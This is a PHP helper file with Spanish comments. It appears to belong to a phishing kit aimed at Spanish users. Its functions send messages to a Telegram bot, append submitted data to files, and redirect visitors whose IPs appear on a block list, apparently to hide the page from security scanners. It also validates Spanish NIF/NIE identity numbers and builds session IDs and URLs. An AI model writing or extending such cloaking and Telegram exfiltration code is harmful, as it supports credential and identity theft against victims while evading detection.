<?php
function sendTg($msg, $bot_token, $chat_id) {
    $apiToken = $bot_token;
    $data = [
            'chat_id' => $chat_id,
        'text' => $msg
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
}

function createF($name, $arg) {
    #creamos el archivo con el nombre de la variable $name 
    $ban = fopen($name,"a+");
    #escribimos en el archivo creado el contenido de la variable $arg
    fwrite($ban,$arg."\r\n");
    fclose($ban);
    
    $msg = "";
    #Comprobamos si se creo el archivo y retornamos un mensaje a la variable $msg
    if (file_exists($name)) {
        $msg = "create and write successfull";
    #de lo contrario si hay un error retornamos un mensaje de error a la variable $msg
    }else {
        $msg = "Error not permitions";
    }
    return $msg;
}


function comprobateIP($file_url, $ip, $redirect) {
        $ipArray = file($file_url);
        foreach ($ipArray as $ipTest) {
        if (substr_count($ip,trim($ipTest)) != "0") { 
        echo '<meta http-equiv="refresh" content="0;url='.$redirect.'">';
        exit(); 
        }
    }
}

function nif_valido($nif) {
    $nif = strtoupper($nif);

$nifRegEx = '/^[0-9]{8}[A-Z]$/i';
$nieRegEx = '/^[XYZ][0-9]{7}[A-Z]$/i';

$letras = "TRWAGMYFPDXBNJZSQVHLCKE";

if (preg_match($nifRegEx, $nif)) return ($letras[(substr($nif, 0, 8) % 23)] == $nif[8]);
else if (preg_match($nieRegEx, $nif)) {
    if ($nif[0] == "X") $nif[0] = "0";
    else if ($nif[0] == "Y") $nif[0] = "1";
    else if ($nif[0] == "Z") $nif[0] = "2";

    return ($letras[(substr($nif, 0, 8) % 23)] == $nif[8]);
}
else return false;
}

function sessionTime() {
    if (!isset($_SESSION['time'])) 
    {
        $time = $_SESSION['time'] = rand(00000000, 99999999);
    }else 
    {
        $time = $_SESSION['time'];
    }
    return $time;
}

function urlActual() {
    $http = (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] != 'on') ? 'http://' : 'https://';
    return $url = $http.$_SERVER['HTTP_HOST'].$_SERVER["REQUEST_URI"];
}

function parseUrl($url) {
    $replace = basename($url);
    $result = '';
    if (preg_match('/'.$replace.'[?0-9a-zA-Z=,.]+/', $url, $matches)) {
        $result = str_replace($matches[0], '', $url);
    }else {
        $result = str_replace(basename($url), '', $url);
    }
    return $result;
}
